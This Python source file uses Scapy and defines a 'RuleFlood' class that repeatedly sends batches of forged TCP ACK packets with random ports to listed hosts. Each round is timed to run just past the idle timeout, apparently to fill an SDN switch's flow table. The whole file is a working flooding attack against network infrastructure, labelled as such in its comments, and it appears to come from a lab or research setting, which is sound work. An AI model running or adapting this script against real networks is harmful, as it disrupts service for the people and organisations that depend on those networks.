from scapy.all import *
import random
import sys
import time

class RuleFlood(object):
    def __init__(self, iface, valid_hosts, max_flows=100, idle_time=3):
        super(RuleFlood, self).__init__()
        self.iface = iface
        self.valid_hosts = valid_hosts
        # max flow entries during attacks 
        self.max_flows = max_flows
        self.idle_time = idle_time
    
    def gen_pkts(self):
        fab_pkts = []
        for i in range(self.max_flows):
            dst = random.choice(self.valid_hosts)
            sport = random.randint(10000, 60000)
            dport = random.randint(10000, 60000)
            payload = b'\x00' * random.randint(100, 200)
            pkt = Ether()/IP(dst=dst)/TCP(sport=sport, dport=dport, flags="A")/payload
            fab_pkts.append(pkt)
        return fab_pkts

    # each ground of attack is independent, the interval of each ground is slightly longer than idle_timeout.
    def start(self, times=10000):
        print('starting...')
        fab_pkts = self.gen_pkts()
        for i in range(times):
            cur_time = time.time()
            end_time = cur_time + self.idle_time + 0.5
            sendp(fab_pkts, iface=self.iface, verbose=False)
            cur_time = time.time()
            if cur_time < end_time:
                time.sleep(end_time - cur_time)

if __name__ == '__main__':
    hosts = ['192.168.40.7', '192.168.40.8']
    try:
        for idx, param in enumerate(sys.argv):
            if param == '-e':
                iface = sys.argv[idx+1] 
            elif param == '-f':
                max_flows = int(sys.argv[idx+1]) 
            else:
                pass 
        flooder = RuleFlood(iface, hosts, max_flows=max_flows)
        flooder.start()
    except KeyboardInterrupt:
        print('test done...')
